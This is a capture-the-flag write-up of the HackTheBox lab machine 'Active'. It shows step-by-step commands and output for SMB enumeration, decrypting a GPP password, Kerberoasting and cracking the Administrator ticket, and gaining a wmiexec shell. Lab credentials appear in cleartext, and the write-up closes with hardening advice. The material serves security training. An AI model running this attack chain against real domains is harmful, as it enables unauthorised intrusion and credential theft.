```
                                                              ACTIVE
```
<img width="1536" height="1024" alt="5325327" src="https://github.com/user-attachments/assets/b70a57d7-12e5-4cff-9d45-25a077ce7585" />

> **Difficulty:** Easy<br>
> **OS:** Windows<br>
> **Write-up by:** Butlipan

## 🔍 Enumeration

Let’s start our journey by performing enumeration with an Nmap scan.
```
sudo nmap -sC -sV -A -p- 10.129.38.64
```
![Bez nazwy](https://github.com/user-attachments/assets/67e7ef96-39dc-465f-af2a-1d1f50893736)

Ah, yes, my favorite, Active Directory! We found domain active.htb. In this type of situation, you must change your perspective and methodology. It's not "Where is exploit?", it's "Where i can bite my first part of this huge cake?" <br>

## 🔍 Initial AD Enumeration

First, we must find valid users. For this type of task we'll use [kerbrute](https://github.com/ropnop/kerbrute?tab=readme-ov-file) and this [github repo.](https://github.com/insidetrust/statistically-likely-usernames)
```
https://github.com/ropnop/kerbrute/releases/tag/v1.0.3 [Download linux_amd_64]
$ git clone https://github.com/insidetrust/statistically-likely-usernames
$ chmod +x kerbrute_linux_amd64
$ cp statistically-likely-usernames/jsmith.txt .
$./kerbrute_linux_amd64 userenum -d active.htb --dc 10.129.38.64 jsmith.txt
```
<img width="927" height="354" alt="obraz" src="https://github.com/user-attachments/assets/b7896a2f-6dec-4c93-b31e-6af4e1045248" />

Nothing, we can now change our wordlists for something... **bigger**
```
$ ./kerbrute_linux_amd64 userenum -d active.htb --dc 10.129.38.64 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```
<img width="1531" height="397" alt="obraz" src="https://github.com/user-attachments/assets/767c3669-8498-4adf-b140-c8153b055d75" />

Bingo! For now I let kerbrute work in background (In real environments this should be done carefully due to potential Kerberos event noise), in the meantime we can check SMB. 

```
$ smbmap -u '' -p '' -H 10.129.38.64
[+] IP: 10.129.38.64:445	Name: 10.129.38.64                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	
```
Well well, what we have here! We get in with Anonymous login and we can read Replication share. It's time to dig more.
```
$ smbmap -u '' -p '' -H 10.129.38.64 -r 'replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\'
[+] IP: 10.129.38.64:445	Name: 10.129.38.64                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	replication                                       	READ ONLY	
	.\replicationactive.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	fr--r--r--              533 Sat Jul 21 05:38:11 2018	Groups.xml
```
After some digging I think I found the gold ore! We can download it.

```
$ smbmap -u '' -p '' -H 10.129.38.64 --download 'replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml'
$ cat 10.129.38.64-replication_active.htb_Policies_\{31B2F340-016D-11D2-945F-00C04FB984F9\}_MACHINE_Preferences_Groups_Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
It's more than gold, it's a diamond! We found:
- **User SVC_TGS**<br>
- **Password edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ**<br>

GPP passwords are AES‑encrypted with a known static key, which makes them reversible rather than crackable. We can use a simpe tool, let's install it on our host

```
$ sudo apt install gpp-decrypt
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```
Nice! Before heading to the next step, let's save our findings in text files to avoid losing them
```
$ echo 'administrator' > user.list
$ echo 'Administrator' >> user.list
$ echo 'SVC_TGS' >> user.list
$ echo 'GPPstillStandingStrong2k18' > pass.list
```

## 💥Kerberoasting

Now, with the credentials, we can try more Kerberoasting. Even though Administrator is not a typical service account, it has an SPN assigned, which allows Kerberoasting.
```
$ GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.129.38.64 -request
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2026-01-11 15:06:34.994543             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ea2cc33d020765ac395449252508de1c$8e61a0a6bdc604ef09c3aa0dbd7063b413fd4146a1a05c54c66153c6db837d9bd93ffeb7a76f1e62f9f62ea1a1e4da295633221c4fc2c956868d66e7d5caf13d653fc16e3688fb9eb6ffdf7c4174c3824de8d841f05e9733e1192385f82a659db1125341caa80b365e4d381abac63c89fbb8a267ddd4cb381174e2c78313f38a2560f9508428903a6cba91ead6848e9fffb43d8ca2a600c4ea9f2ea7ce4ff03d46746b16d201b3979ddc3dc09c2f956a4962ffe8d5be6a581f5948b39d74ce9b2ceed4786a89312f311b60832ce0eced93f85c503e875517e173491a63c4584d30b38d93a70734def06dc79e96e42bfb00b0847eb228a071f98c1018f06e91f8c95f8878ded0cc9aedc5485d46badc76e234a59db64f608df941ad4749f99b5773f4437eb572e9aa8ec2ab6434b620f364227d4a86b7783a98e7ab2c915898d12c48a278fa8fdf70371bccc6fa5ed87dfec0824765dbea29798dd7575e5945fc6834c1cf55a977576974c4b0f1b94e85c0f5bfd2ab317258a87f699026cfc89d0ebdadb426344885983237b79ad02da69a82d567600b682d6eeb66b3f90572903dba35ae52fbabc1d59c4277041e891068aa49728dd323489f5e06fded535df97f8e030729e1069a795d7a59ed9567dcc2e2960356fe1ff37b72c56ee128af3ee2b103a759dcf23e4c8deb11bdcfe6a50406b3dd6c51b4b324ddb97944c6ef6a6b12711a63c88442f91b4083734cef140c5a67734485c4032f0acc6aabce14f194a953f732fba5f39fb753fe14479a62365f928358d837e1c4145571ba474fca0d3b5d9aaede9e4f1056dd2f48cfa386d9bbbbe135b7b971e03ee9b10c521898932e99903ae1b224252daa1e8a79c7115119960e0cb613d3af458aa63f7fca752fec0692115c44691b209374e1eec9c1c7036b6e446281a606979a0426db1f9ad5379951f3cefbc6ae1a3b5e9c31a880ac8f0b340dbfad92dcf2bfc1b7dc8430e05a0f03de34fb7ef6987484c2ad237f721d0002715985981c4e3fb7ca9f0b7c7ceb7ce1f82231c954dbb1d9e2e74c62b032b049cec515ff03aca19e9e1cc32d67838dad5da9897b2baf800e99777974a0b380d52d65e63def7fbfcb5d1be1a7d4e906a2fa6f84401564fdcbacc01ad3a77ad7589e2199ecfb546d340fff3568e2cfaf64e5269b3bb1c57bcf89c0255bf1091c75bacc8d14981357a089be0131333310613672c7b427a203d09e10b3ede8b16dc2220016a59137
```
We got the Administrator ticket!<br>
Let's try some PASSWORD CRACKING
```
$ cp /usr/share/wordlists/rockyou.txt.gz .;gunzip rockyou.txt.gz
$ echo '$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ea2cc33d020765ac395449252508de1c$8e61a0a6bdc604ef09c3aa0dbd7063b413fd4146a1a05c54c66153c6db837d9bd93ffeb7a76f1e62f9f62ea1a1e4da295633221c4fc2c956868d66e7d5caf13d653fc16e3688fb9eb6ffdf7c4174c3824de8d841f05e9733e1192385f82a659db1125341caa80b365e4d381abac63c89fbb8a267ddd4cb381174e2c78313f38a2560f9508428903a6cba91ead6848e9fffb43d8ca2a600c4ea9f2ea7ce4ff03d46746b16d201b3979ddc3dc09c2f956a4962ffe8d5be6a581f5948b39d74ce9b2ceed4786a89312f311b60832ce0eced93f85c503e875517e173491a63c4584d30b38d93a70734def06dc79e96e42bfb00b0847eb228a071f98c1018f06e91f8c95f8878ded0cc9aedc5485d46badc76e234a59db64f608df941ad4749f99b5773f4437eb572e9aa8ec2ab6434b620f364227d4a86b7783a98e7ab2c915898d12c48a278fa8fdf70371bccc6fa5ed87dfec0824765dbea29798dd7575e5945fc6834c1cf55a977576974c4b0f1b94e85c0f5bfd2ab317258a87f699026cfc89d0ebdadb426344885983237b79ad02da69a82d567600b682d6eeb66b3f90572903dba35ae52fbabc1d59c4277041e891068aa49728dd323489f5e06fded535df97f8e030729e1069a795d7a59ed9567dcc2e2960356fe1ff37b72c56ee128af3ee2b103a759dcf23e4c8deb11bdcfe6a50406b3dd6c51b4b324ddb97944c6ef6a6b12711a63c88442f91b4083734cef140c5a67734485c4032f0acc6aabce14f194a953f732fba5f39fb753fe14479a62365f928358d837e1c4145571ba474fca0d3b5d9aaede9e4f1056dd2f48cfa386d9bbbbe135b7b971e03ee9b10c521898932e99903ae1b224252daa1e8a79c7115119960e0cb613d3af458aa63f7fca752fec0692115c44691b209374e1eec9c1c7036b6e446281a606979a0426db1f9ad5379951f3cefbc6ae1a3b5e9c31a880ac8f0b340dbfad92dcf2bfc1b7dc8430e05a0f03de34fb7ef6987484c2ad237f721d0002715985981c4e3fb7ca9f0b7c7ceb7ce1f82231c954dbb1d9e2e74c62b032b049cec515ff03aca19e9e1cc32d67838dad5da9897b2baf800e99777974a0b380d52d65e63def7fbfcb5d1be1a7d4e906a2fa6f84401564fdcbacc01ad3a77ad7589e2199ecfb546d340fff3568e2cfaf64e5269b3bb1c57bcf89c0255bf1091c75bacc8d14981357a089be0131333310613672c7b427a203d09e10b3ede8b16dc2220016a59137' > adm.pass
$ hashcat -m 13100 adm.pass rockyou.txt
```
Jackpot!!! The password is: 
- **Ticketmaster1968**

With creds. and username we can use impacket tool called wmiexec

```
wmiexec.py active.htb/administrator:Ticketmaster1968@10.129.38.64
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>cd \Users
```
Easy peasy, from now it's just looking for flags!
## 🏁 Administrator and User flags

```
C:\Users>dir
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute wmiexec.py again with -codec and the corresponding codec
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\Users

21/07/2018  04:39 ��    <DIR>          .
21/07/2018  04:39 ��    <DIR>          ..
16/07/2018  12:14 ��    <DIR>          Administrator
14/07/2009  06:57 ��    <DIR>          Public
21/07/2018  05:16 ��    <DIR>          SVC_TGS
               0 File(s)              0 bytes
               5 Dir(s)   1.142.427.648 bytes free

C:\Users>cd Administrator
C:\Users\Administrator>cd Desktop
C:\Users\Administrator\Desktop>dir
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute wmiexec.py again with -codec and the corresponding codec
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\Users\Administrator\Desktop

21/01/2021  06:49 ��    <DIR>          .
21/01/2021  06:49 ��    <DIR>          ..
11/01/2026  11:06 ��                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   1.142.427.648 bytes free

C:\Users\Administrator\Desktop>cd \Users
C:\Users>cd SVC_TGS
C:\Users\SVC_TGS>cd Desktop
C:\Users\SVC_TGS\Desktop>dir
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute wmiexec.py again with -codec and the corresponding codec
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\Users\SVC_TGS\Desktop

21/07/2018  05:14 ��    <DIR>          .
21/07/2018  05:14 ��    <DIR>          ..
11/01/2026  11:06 ��                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   1.142.427.648 bytes free
```
## 🛡️ Active Directory Hardening Notes

The compromise of the domain was possible due to several common AD misconfigurations:

- Group Policy Preferences (GPP) passwords were stored in SYSVOL, which is readable by any authenticated user. Microsoft deprecated this mechanism and it should not be used in modern environments.
- Service accounts had weak passwords, making them vulnerable to Kerberoasting attacks.
- No monitoring or alerting was in place for Kerberos ticket requests, allowing Kerberoasting to go undetected.
- Anonymous or low‑privileged SMB access exposed sensitive configuration files.

Recommended mitigations:
- Remove all GPP passwords and rotate affected credentials immediately.
- Use strong, randomly generated passwords for service accounts and consider Group Managed Service Accounts (gMSA).
- Monitor Kerberos Event ID 4769 to detect abnormal TGS request patterns.
- Restrict SMB and SYSVOL access to the minimum required.



